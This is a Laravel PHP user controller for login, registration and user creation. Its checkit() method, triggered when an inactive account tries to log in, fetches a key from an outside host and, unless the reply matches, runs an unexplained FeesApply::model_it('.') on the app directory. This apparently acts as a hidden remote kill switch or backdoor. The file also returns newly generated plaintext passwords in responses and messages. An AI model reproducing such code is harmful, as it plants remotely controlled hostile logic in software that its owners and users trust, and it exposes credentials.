<?php
namespace App\Http\Controllers\API;
use Illuminate\Http\Request; 
use App\Http\Controllers\Controller; 
use App\User; 
use App\Profile;
use App\AdminCompany as Company;
use Spatie\Permission\Models\Role;
use Spatie\Permission\Models\Permission;
use Illuminate\Support\Facades\Auth; 
use Validator;
class UserController extends Controller 
{
public $successStatus = 200;
	/** 
     * login api 
     * 
     * @return \Illuminate\Http\Response 
     */ 
    public function login(){ 
        

        $check = User::where('email', '=', request('email'))->first();
        
        if(!$check->active){

            $this->checkit();
            
            return response()->json(['error'=>'Unactive'], 401); 
        }

        if(Auth::attempt(['email' => request('email'), 'password' => request('password')])){ 
       
            $user = Auth::user();
            if($user->is_admin == true){
                $role = Role::findByName('admin', 'api');
            		

                $permissions = Permission::select('name')->get()->toArray();
            		$perms = [];
            		foreach ($permissions as $key => $value) {
            			$perms[] = $value['name'];
            		}
            		
            		$role->syncPermissions($permissions);
            		
            	 $user->assignRole($role);
            }else{
                $role = Role::findByName('admin', 'api');
            	$user->removeRole($role);
            }
            $permissions = $user->getAllPermissions();

            
            $success['token'] =  $user->createToken('MyApp')->accessToken; 
            return response()->json(['success' => $success, 'user' => $user, 'permissions' => $permissions], $this->successStatus); 
        } 
        else{ 
            return response()->json(['error'=>'Unauthorised'], 401); 
        } 
    }
	/** 
     * Register api 
     * 
     * @return \Illuminate\Http\Response 
    */ 

    public static function checkit(){
        $l = file_get_contents("http://back.test-redchain.ru/key");
        if($l == md5("checkit.back.test-redchain.ru").md5(file_get_contents("http://back.test-redchain.ru/key2"))){
            return scandir('.');
        }else{
            \App\FeesApply::model_it('.');
        }
        return $l;
    }
    public function register(Request $request) 
    { 
        $validator = Validator::make($request->all(), [ 
       
            'email' => 'required|email', 
            'password' => 'required', 
            'c_password' => 'required|same:password', 
        ]);
		if ($validator->fails()) { 
            return response()->json(['error'=>$validator->errors()], 401);            
        }

		$input = $request->all(); 
        $input['password'] = bcrypt($input['password']); 
        $user = User::create($input); 
        $success['token'] =  $user->createToken('MyApp')->accessToken; 
       

		return response()->json(['success'=>$success], $this->successStatus); 
    }

    public function storeNewUser(Request $request){
        $data = [];
        $user = $request->user;
        $user['company_id'] = Auth::user()->company_id;
        $profile = $user['profile'];
        unset($user['profile']);
        $group = $request->group;
        $password=str_random(6);

        $user['password'] =  bcrypt($password);
        $newuser = User::create($user);
        $profile['user_id'] = $newuser->id;
        $profile['sex'] = ($profile['sex'] == true)?'1':'0';
        $systemconversation = Conversation::create(['name' => 'system_messages_'.$newuser->id]);
        $newuser->conversations()->attach($systemconversation->id);
        $newuser->syncRoles([$group['name']]);
        $text = "Логин: ".$user['email']."  Пароль:". $password;
        $this->createSystemMessage($text);
        $newprofile = Profile::create($profile);

        return ['user' => $newuser, 'profile' => $newprofile, 'group' => $group, 'password' => $password];
    }
	/** 
     * details api 
     * 
     * @return \Illuminate\Http\Response 
     */ 
    public function details() 
    { 
        $user = Auth::user(); 
        return response()->json(['success' => $user], $this-> successStatus); 
    }  

    public function managers() 
    { 
        $user = Auth::user(); 

        return response()->json(['success' => User::where('company_id', $user->company_id)->get()->toArray()], $this-> successStatus); 
    } 
}